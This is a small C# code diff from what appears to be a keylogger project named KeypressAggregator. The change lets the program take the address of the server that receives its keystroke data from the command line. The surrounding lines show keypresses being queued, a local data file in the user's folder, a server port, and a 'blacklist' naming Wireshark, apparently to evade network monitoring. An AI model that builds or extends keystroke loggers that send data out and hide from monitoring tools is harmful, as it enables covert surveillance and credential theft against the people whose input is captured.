@@ -20,11 +20,20 @@ namespace KeypressAggregator
             string newFile = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\data";
             string addr = "localhost";
             int port = 4567;
-            string serveraddr = "localhost";
+            string serveraddr;
             int serverport = 13000;
             var blacklist = new List<string>();
             blacklist.Add("Wireshark");
 
+            if (args.Length == 1)
+            {
+                serveraddr = args[0];
+            }
+            else
+            {
+                serveraddr = "server";
+            }
+            
             // Setup the shared resources
             ConcurrentQueue<KeyPress> inputbuffer = new ConcurrentQueue<KeyPress>();
             ConcurrentQueue<CI> outbuffer = new ConcurrentQueue<CI>();
